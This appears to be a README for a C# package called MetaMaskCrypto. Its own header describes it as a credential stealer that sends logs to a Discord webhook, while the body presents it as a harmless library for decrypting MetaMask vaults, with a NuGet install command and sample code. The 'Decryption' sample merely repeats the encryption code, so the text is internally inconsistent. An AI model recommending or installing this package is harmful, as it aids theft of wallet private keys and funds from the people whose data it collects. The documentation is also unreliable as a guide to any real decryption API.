<p align="center">
  <img width="40%" src="metamask234good.webp"> <br>
  <b>MetaMask Vault Decryptor</b> <br>
  <i>Stealer written on C#, logs will be sent to your Discord channel using a webhook.</i>
</p>

MetaMaskCrypto is a C# library that provides functionality for decrypting vaults encrypted by MetaMask. It allows you to securely access encrypted private keys and other sensitive information stored in your MetaMask vault.

## Features

- Decryption of MetaMask vaults
- Retrieval of encrypted private keys and other sensitive information

## Installation

MetaMaskCrypto can be easily installed via [NuGet](https://www.nuget.org/). Follow the steps below to install the library in your project:

1. Open the NuGet Package Manager Console in Visual Studio or the terminal in your project directory.
2. Run one of the following commands:

```bash
Install-Package MetaMaskCrypto
```
## Usage

To use MetaMaskCrypto in your project, follow the example code below:

### Encryption

```csharp
using MetaMaskCrypto;

class Program
{
    static void Main()
    {
        // Initialize MetaMaskCrypto
        MetaMaskCryptoManager cryptoManager = new MetaMaskCryptoManager();

        // Provide the private key to encrypt
        string privateKey = "<your private key>";

        // Provide the user's password
        string password = "<user's password>";

        // Encrypt the private key
        string encryptedPrivateKey = cryptoManager.EncryptPrivateKey(privateKey, password);

        // Use the encrypted private key for further operations
        // ...

        // Clear the encrypted private key from memory when done
        MetaMaskCryptoUtils.ClearSensitiveData(encryptedPrivateKey);
    }
}
```


### Decryption

```csharp
using MetaMaskCrypto;

class Program
{
    static void Main()
    {
        // Initialize MetaMaskCrypto
        MetaMaskCryptoManager cryptoManager = new MetaMaskCryptoManager();

        // Provide the private key to encrypt
        string privateKey = "<your private key>";

        // Provide the user's password
        string password = "<user's password>";

        // Encrypt the private key
        string encryptedPrivateKey = cryptoManager.EncryptPrivateKey(privateKey, password);

        // Use the encrypted private key for further operations
        // ...

        // Clear the encrypted private key from memory when done
        MetaMaskCryptoUtils.ClearSensitiveData(encryptedPrivateKey);
    }
}
```
